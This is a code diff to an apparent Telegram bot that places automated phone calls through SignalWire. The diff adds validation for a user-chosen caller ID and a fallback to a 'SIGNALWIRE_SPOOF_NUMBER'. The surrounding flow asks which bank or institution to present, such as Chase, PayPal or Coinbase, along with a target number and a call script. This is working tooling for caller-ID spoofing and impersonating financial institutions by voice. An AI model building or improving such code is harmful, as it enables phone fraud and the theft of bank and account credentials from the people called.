@@ -1331,7 +1331,8 @@ function registerMessageHandler(b: Telegraf): void {
     const text   = ctx.message.text.trim();
 
     // Skip real commands (handled by command handlers)
-    const isFlowConfirmReply = getFlow(chatId).callCount === 6 && (text === '/accept' || text === '/Decline');
+    const textLc = text.toLowerCase();
+    const isFlowConfirmReply = getFlow(chatId).callCount === 6 && (textLc === '/accept' || textLc === '/decline');
     if (text.startsWith('/') && !isFlowConfirmReply) return;
 
     // Admin two-step prompts take priority
@@ -1431,7 +1432,18 @@ function registerMessageHandler(b: Telegraf): void {
     }
 
     if (flow.callCount === 1) {
-      flow.UN = text; flow.callCount = 2;
+      // Validate caller ID — must be a phone number or 'skip'
+      const cleaned = text.trim().replace(/[\s\-()]/g, '');
+      if (text.toLowerCase() !== 'skip' && !checkNumber(cleaned)) {
+        await nextPrompt(new Msg()
+          .emoji(E.WARNING).sp().bold('Invalid caller ID format.').nl(2)
+          .italic('Enter a phone number with + and country code, e.g. +12025551234').nl()
+          .italic('Or type ').bold('skip').italic(' to use the default number.'));
+        flow.callCount = 1; // stay on this step
+        return;
+      }
+      flow.UN = text.toLowerCase() === 'skip' ? (process.env['SIGNALWIRE_SPOOF_NUMBER'] ?? process.env['SIGNALWIRE_FROM_NUMBER'] ?? '') : cleaned;
+      flow.callCount = 2;
       await nextPrompt(new Msg()
         .emoji(E.BANK).sp().bold('Bank / Institution name:').nl()
         .italic('(e.g. Chase Bank, PayPal, Coinbase — or type skip)'));
@@ -1476,7 +1488,8 @@ function registerMessageHandler(b: Telegraf): void {
     }
 
     if (flow.callCount === 6) {
-      if (text === '/Decline') {
+      const textLower = text.toLowerCase();
+      if (textLower === '/decline') {
         if (flow.lastBotMsgId) {
           try { await b.telegram.deleteMessage(chatId, flow.lastBotMsgId); } catch { /* ignore */ }
         }
@@ -1486,7 +1499,7 @@ function registerMessageHandler(b: Telegraf): void {
         return;
       }
 
-      if (text === '/accept') {
+      if (textLower === '/accept') {
         if (flow.lastBotMsgId) {
           try { await b.telegram.deleteMessage(chatId, flow.lastBotMsgId); } catch { /* ignore */ }
         }
@@ -1540,7 +1553,7 @@ async function placeCallNow(b: Telegraf, chatId: number, flow: FlowState): Promi
 
   try {
     const callSid  = await makeCall(flow.VN, voiceUrl, flow.UN || undefined);
-    createSession(chatId, flow.VN, callSid, scriptId);
+    createSession(chatId, flow.VN, callSid, scriptId, callMode as any, flow.UN || undefined);
     bumpCallStat(chatId);
     const username = getUser(chatId)?.username;
     logCall({ chatId, username, mode: flow.deviceName, phone: flow.VN, callSid, status: 'initiated', ts: Date.now() });
@@ -1568,7 +1581,7 @@ async function placeCallNow(b: Telegraf, chatId: number, flow: FlowState): Promi
     logger.error({ err, errMsg }, 'makeCall failed');
     const m = new Msg()
       .emoji(E.CROSS).sp().bold('Call failed to connect.').nl(2)
-      .mono(errMsg.slice(0, 300)).nl(2)
+      .code(errMsg.slice(0, 300)).nl(2)
       .italic('Use /call to try again.');
     msgSend(b, chatId, m);
   }
